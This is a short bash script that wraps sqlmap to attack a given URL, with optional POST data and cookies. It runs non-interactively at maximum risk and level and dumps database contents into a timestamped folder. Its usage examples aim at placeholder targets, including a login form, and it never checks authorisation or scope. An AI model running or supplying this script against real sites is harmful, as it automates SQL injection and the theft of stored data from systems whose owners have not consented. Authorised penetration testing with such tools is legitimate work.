#!/bin/bash
if [[ -z "$1" ]]; then
    echo "Usage: $0 <url> [--data '<post_data>'] [--cookie '<cookies>']"
    echo "Example:"
    echo "  $0 'http://target.com/page.php?id=1'"
    echo "  $0 'http://target.com/login.php' --data 'user=admin&pass=1'"
    exit 1
fi

URL="$1"
shift

TIMESTAMP=$(date +%F_%H%M)
OUTDIR="sqlmap_$(echo "$URL" | sed 's|[:/?=&]||g')_$TIMESTAMP"

mkdir -p "$OUTDIR"

echo "[*] Starting SQLMap against: $URL"
echo "[*] Output will be saved in: $OUTDIR"

sqlmap -u "$URL" \
    "$@" \
    --batch \
    --risk=3 --level=5 \
    --dump \
    --threads=4 \
    --output-dir="$OUTDIR"

echo "[+] SQLMap run complete. Results saved in: $OUTDIR"

